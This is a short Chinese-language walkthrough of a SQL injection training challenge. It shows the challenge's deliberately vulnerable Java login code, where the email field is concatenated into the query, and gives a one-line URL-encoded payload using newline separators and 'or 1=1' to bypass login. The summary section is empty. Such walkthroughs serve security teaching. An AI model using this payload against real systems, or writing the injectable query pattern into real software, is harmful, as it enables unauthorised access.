# SQL Injection Challenge 7(SQL 注入 7)
 
## 题介绍
利用SQL注入 登录系统 

## 功能实现 

原始代码  
```

String subEmail = Validate.validateParameter(request.getParameter("subEmail"), 60);
log.debug("subEmail - " + subEmail.replaceAll("\n", " \\\\n ")); //Escape \n's
String subPassword = Validate.validateParameter(request.getParameter("subPassword"), 40);
log.debug("subPassword - " + subPassword); 
boolean validEmail = Validate.isValidEmailAddress(subEmail.replaceAll("\n", "")); //Ignore \n 's  验证邮箱 
if(!subPassword.isEmpty() && !subPassword.isEmpty() && validEmail)
{
	Connection conn = Database.getChallengeConnection(applicationRoot, "SqlChallengeSeven");
	try
	{
		log.debug("Signing in with subitted details");
		PreparedStatement prepstmt = conn.prepareStatement("SELECT userName FROM users WHERE userEmail = '" + subEmail + "' AND userPassword = ?;"); //邮箱是可以注入的
		prepstmt.setString(1, subPassword);
		ResultSet users = prepstmt.executeQuery();
		if(users.next())
		{
			htmlOutput = "<h3>" + bundle.getString("response.welcome")+ " " + Encode.forHtml(users.getString(1)) + "</h3>"
					+ "<p>" + bundle.getString("response.resultKey")+ "" + Hash.generateUserSolution(Getter.getModuleResultFromHash(applicationRoot, levelHash), (String)ses.getAttribute("userName")) + "</p>";
		}
		else
		{
			htmlOutput = "<h3>" + bundle.getString("response.incorrectCreds")+ "</h3><p>" + bundle.getString("response.carefulNow")+ "</p>";
		}
	}
	catch(Exception e)
```



## 解题步骤  

```
subEmail=te%40qq.com'%0aor%0a1%3D1%0aor%0a'23'!='&subPassword=passtest%40qq.com
```
需要用到 %0a 进行分割  


## 总结  

